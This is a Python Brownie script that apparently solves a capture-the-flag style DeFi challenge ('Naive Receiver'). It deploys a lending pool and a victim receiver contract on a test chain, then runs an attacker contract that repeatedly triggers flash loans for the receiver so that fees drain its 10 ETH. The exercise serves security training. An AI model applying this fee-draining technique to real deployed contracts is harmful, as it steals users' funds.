from scripts.helper.utils import *
from brownie import NaiveReceiverLenderPool, FlashLoanReceiver, NaiveReceiverAttack

def main():
    ####################################################################
    ######### SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE #########
    ####################################################################

    # starting setup messages
    message('setup_start')

    # tokens in pool and tokens in receiver
    ETHER_IN_POOL = ether_to_wei(1000)
    ETHER_IN_RECEIVER = ether_to_wei(10)

    # import accounts
    deployer, _fromDeployer, attacker, _fromAttacker, some_user, _fromSomeUser = define_from_acc(qty=3)

    # deploy the contracts
    pool = NaiveReceiverLenderPool.deploy(_fromDeployer)

    # fund the pool
    deployer.transfer(pool.address, ETHER_IN_POOL)

    # confirm the balances are correct
    assert pool.balance() == ETHER_IN_POOL
    assert pool.fixedFee() == int(Decimal(repr(1e18)))

    # deploy flash loan receiver
    receiver = FlashLoanReceiver.deploy(pool.address, _fromDeployer)

    # fund the receiver
    deployer.transfer(receiver.address, ETHER_IN_RECEIVER)

    # confirm the balances are correct
    assert receiver.balance() == ETHER_IN_RECEIVER

    # check if solved
    def solution_assertion():
        message('final_assertion_check')
        try:

            ############################################
            ############ SUCCESS CONDITIONS ############
            ############################################
            # All ETH has been drained from the receiver
            assert receiver.balance() == 0
            assert pool.balance() == ETHER_IN_POOL + ETHER_IN_RECEIVER
            return True
        except:
            return False

    # done setting up
    message('setup_end')
    message('solution_start')
# #########################################################
# There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.
#
# You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.
#
# Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;) 
# #########################################################

    ##############################
    ##### SOLUTION GOES HERE #####
    ##############################

    # deploy attacker contract which calls `flashLoan` to the receiver 10 times in a loop
    attacker_contract = NaiveReceiverAttack.deploy(receiver.address, pool.address, _fromAttacker)

    # call `attack()` to start the attack
    attacker_contract.attack(_fromAttacker)

###############################################################
###################### CHECKING SOLUTION ######################
###############################################################
    message('solution_end')
    print(f'Challenge is solved: {solution_assertion()}')
